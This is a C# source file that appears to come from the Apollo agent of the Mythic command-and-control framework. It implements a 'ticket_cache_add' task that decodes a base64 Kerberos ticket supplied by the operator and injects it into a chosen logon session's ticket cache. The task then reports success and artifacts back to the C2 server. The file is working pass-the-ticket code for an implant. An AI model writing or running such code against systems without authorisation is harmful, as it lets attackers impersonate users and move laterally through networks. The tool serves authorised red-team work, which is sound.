#define COMMAND_NAME_UPPER

#if DEBUG
#define TICKET_CACHE_ADD
#endif

#if TICKET_CACHE_ADD

using System;
using System.Collections.Generic;
using System.Runtime.Serialization;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;

namespace Tasks;

public class ticket_cache_add : Tasking
{
    
    [DataContract]
    internal struct TicketCacheAddParameters
    {
        [DataMember(Name = "luid")]
        internal string? luid;
        [DataMember(Name = "base64ticket")]
        internal string base64Ticket;
    }

    public ticket_cache_add(IAgent agent, MythicTask data) : base(agent, data)
    { }
    public override void Start()
    {
        MythicTaskResponse resp = new MythicTaskResponse { };
        try
        {
            TicketCacheAddParameters parameters = _jsonSerializer.Deserialize<TicketCacheAddParameters>(_data.Parameters);
            string luid = parameters.luid ?? "";
            string base64Ticket = parameters.base64Ticket;
            byte[] ticketBytes = Convert.FromBase64String(base64Ticket);
            if (_agent.GetTicketManager().LoadTicketIntoCache(ticketBytes, luid))
            {
                resp = CreateTaskResponse($"Injected Ticket into Cache", true);
            }
            else
            {
                resp = CreateTaskResponse($"Failed to inject ticket into cache", true, "error");
            }
        }
        catch (Exception e)
        {
            resp = CreateTaskResponse($"Failed to inject ticket into session: {e.Message}", true, "error");
        }
        //get and send back any artifacts
        IEnumerable<Artifact> artifacts = _agent.GetTicketManager().GetArtifacts();
        var artifactResp = CreateArtifactTaskResponse(artifacts);
        _agent.GetTaskManager().AddTaskResponseToQueue(artifactResp);
        
        _agent.GetTaskManager().AddTaskResponseToQueue(resp);
    }
}
#endif